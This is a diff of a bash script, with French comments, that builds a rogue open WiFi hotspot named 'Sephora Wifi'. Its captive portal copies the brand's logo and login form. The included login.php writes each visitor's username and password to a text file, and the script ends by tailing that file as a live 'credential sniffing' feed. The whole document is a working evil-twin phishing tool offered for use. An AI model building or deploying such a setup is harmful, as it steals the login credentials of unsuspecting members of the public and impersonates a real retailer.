@@ -9,22 +9,20 @@ DHCP_RANGE_START="192.168.1.100"
 DHCP_RANGE_END="192.168.1.200"
 DHCP_LEASE_TIME="12h"
 
-echo "🚀 Setting up WiFi Access Point..."
+echo "[+] Création de l'Access Point..."
 
-# 1 Bring up the WiFi interface with a static IP
-echo "🔹 Configuring $WIFI_IFACE with static IP..."
+echo "[+] Configuration de $WIFI_IFACE avec IP statique."
 ip link set $WIFI_IFACE up
 ip addr flush dev $WIFI_IFACE
 ip addr add $WIFI_IP/24 dev $WIFI_IFACE  # Keeping /24 for simplicity
 
-# 2 Enable IP forwarding for internet sharing
-echo "🔹 Enabling IP forwarding..."
+echo "[+] Activation IP forwarding..."
 echo 1 > /proc/sys/net/ipv4/ip_forward
 sed -i 's/^#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
 sysctl -p
 
 # 3 Set up iptables rules for NAT
-echo "🔹 Configuring iptables rules for NAT..."
+echo "[+] Configuration des règles iptables..."
 iptables --flush
 iptables --table nat --flush
 iptables --delete-chain
@@ -32,17 +30,13 @@ iptables --table nat --delete-chain
 iptables -t nat -A POSTROUTING -o $ETH_IFACE -j MASQUERADE
 iptables -A FORWARD -i $WIFI_IFACE -o $ETH_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
 iptables -A FORWARD -i $ETH_IFACE -o $WIFI_IFACE -j ACCEPT
-#iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8
-#iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8
-#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
-#iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443
 
-# Ensure iptables rules persist after reboot (better method)
+echo "[+] Configuration persistance des règles iptables..."
 apt install -y iptables-persistent
 iptables-save > /etc/iptables/rules.v4
 
 # 4 Configure dnsmasq (DHCP + DNS)
-echo "🔹 Configuring dnsmasq..."
+echo "[+] Configuration dnsmasq..."
 cat > /etc/dnsmasq.conf <<EOL
 interface=$WIFI_IFACE
 listen-address=$WIFI_IP
@@ -59,17 +53,16 @@ EOL
 systemctl restart dnsmasq
 
 # 5 Configure hostapd (WiFi AP)
-echo "🔹 Configuring hostapd..."
+echo "[+] Configuration hostapd..."
 cat > /etc/hostapd/hostapd.conf <<EOL
 interface=$WIFI_IFACE
 driver=nl80211
-ssid=MyAccessPoint
+ssid=Sephora Wifi
 hw_mode=g
 channel=7
 wpa=0
 EOL
 
-# Ensure hostapd uses this config
 sed -i 's|^#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
 
 echo "[+] Génération du certificat SSL auto-signé..."
@@ -77,68 +70,21 @@ openssl req -newkey rsa:2048 -nodes -keyout /etc/ssl/private/captive.key -x509 -
 
 echo "[+] Configuration du portail captif..."
 mkdir -p /var/www/html/
-cat <<EOF > /var/www/html/index.html
+cat > /var/www/html/index.html <<EOF
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
     <title>Connexion WiFi</title>
     <style>
-        body {
-            font-family: sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-
-        form {
-            width: 400px;
-            text-align: center; 
-        }
-
-        .logo-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .logo-container img {
-            max-width: 300px;
-            height: auto;
-            display: block;
-            margin: 0 auto;
-        }
-
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        input[type="text"],
-        input[type="password"] {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-
-        input[type="submit"] {
-            background-color: black;
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 90%;
-        }
-
-        input[type="submit"]:hover {
-            background-color: #333;
-        }
+        body { font-family: sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        form { width: 400px; text-align: center; }
+        .logo-container { text-align: center; margin-bottom: 20px; }
+        .logo-container img { max-width: 300px; height: auto; display: block; margin: 0 auto; }
+        h2 { color: #333; margin-bottom: 20px; }
+        input[type="text"], input[type="password"] { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        input[type="submit"] { background-color: black; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; width: 90%; }
+        input[type="submit"]:hover { background-color: #333; }
     </style>
 </head>
 <body>
@@ -146,7 +92,7 @@ cat <<EOF > /var/www/html/index.html
         <div class="logo-container">
             <img src="logo.png" alt="Logo">
         </div>
-        <h2>Bienvenue chez Sephora</h2>
+        <h2>Bienvenue</h2>
         <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
         <input type="password" name="password" placeholder="Mot de passe" required><br>
         <input type="submit" value="Connexion">
@@ -155,94 +101,12 @@ cat <<EOF > /var/www/html/index.html
 </html>
 EOF
 
-cat <<EOF > /var/www/html/hotspot-detect.html
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <title>Connexion WiFi</title>
-    <style>
-        body {
-            font-family: sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
+cp /var/www/html/index.html /var/www/html/hotspot-detect.html
 
-        form {
-            width: 400px;
-            text-align: center; 
-        }
-
-        .logo-container {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .logo-container img {
-            max-width: 300px;
-            height: auto;
-            display: block;
-            margin: 0 auto;
-        }
-
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-
-        input[type="text"],
-        input[type="password"] {
-            width: 90%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-
-        input[type="submit"] {
-            background-color: black;
-            color: white;
-            padding: 12px 20px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            width: 90%;
-        }
-
-        input[type="submit"]:hover {
-            background-color: #333;
-        }
-    </style>
-</head>
-<body>
-    <form action="login.php" method="POST">
-        <div class="logo-container">
-            <img src="logo.png" alt="Logo">
-        </div>
-        <h2>Bienvenue chez Sephora</h2>
-        <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
-        <input type="password" name="password" placeholder="Mot de passe" required><br>
-        <input type="submit" value="Connexion">
-    </form>
-</body>
-</html>
-EOF
-
-#iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8
-#iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8
 cat <<'EOF' > /var/www/html/login.php
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
 file_put_contents("/var/www/html/logins.txt", $_POST['username'] . " : " . $_POST['password'] . "\n", FILE_APPEND);
-
-// Autoriser l'IP du client à accéder à Internet
-//exec("sudo iptables -t nat -I PREROUTING -s $ip -j ACCEPT");
-//exec("sudo iptables -I FORWARD -s $ip -j ACCEPT");
 
 // Appliquer les règles DNS pour l'utilisateur connecté
 exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8");
@@ -254,12 +118,33 @@ exec("sudo hostapd_cli deauthenticate $ip");
 echo "<html><head><title>Connexion réussie</title></head><body>";
 echo "<h2>Connexion réussie !</h2>";
 echo "<p>Vous êtes maintenant connecté à Internet.</p>";
-echo "<script>setTimeout(function(){ window.location.href = 'http://google.com'; }, 3000);</script>";
+echo "<script>setTimeout(function(){ window.location.href = 'http://sephora.com'; }, 3000);</script>";
 echo "</body></html>";
 
 exit();
 ?>
 EOF
+
+# Définition des variables
+FILE="/var/www/html/logo.png"
+URL="https://logo-marque.com/wp-content/uploads/2022/02/Sephora-Logo.png"
+
+# Vérifier si le fichier existe
+if [ -f "$FILE" ]; then
+    echo "Le fichier existe déjà : $FILE"
+else
+    echo "Le fichier n'existe pas. Téléchargement en cours..."
+    curl -o logo.png "$URL"
+
+    # Vérifier si le téléchargement a réussi
+    if [ -f "logo.png" ]; then
+        echo "Téléchargement réussi, déplacement du fichier..."
+        sudo mv logo.png "$FILE"
+        echo "Fichier déplacé vers $FILE"
+    else
+        echo "Erreur : le téléchargement a échoué."
+    fi
+fi
 
 touch /var/www/html/logins.txt
 chown www-data:www-data /var/www/html/logins.txt
@@ -311,32 +196,20 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 EOF
 
-echo "[+] Redémarrage des services Apache..."
+echo "[+] Redémarrage des services"
 systemctl restart apache2
 
-echo "[+] Configuration des règles iptables..."
-#iptables --flush
-#iptables --table nat --flush
-#iptables --delete-chain
-#iptables --table nat --delete-chain
-#iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80
-#iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 443
-#echo 1 > /proc/sys/net/ipv4/ip_forward
-
-
-# Enable and restart hostapd
 systemctl unmask hostapd
 systemctl enable hostapd
 systemctl restart hostapd
 
-# 6 Enable services at boot
-echo "🔹 Enabling services at boot..."
 systemctl enable dnsmasq
 systemctl enable hostapd 
 
-# Restart NetworkManager to apply changes
-echo "🔹 Restarting NetworkManager..."
+echo "[+] Restarting NetworkManager..."
 systemctl restart NetworkManager
 
-echo "✅ WiFi Access Point setup complete! 🚀"
-                                                 
+echo "[+] L'Access point est enfin pret !"
+
+echo "Debut du snif de Credentials : "
+tail -f /var/www/html/logins.txt
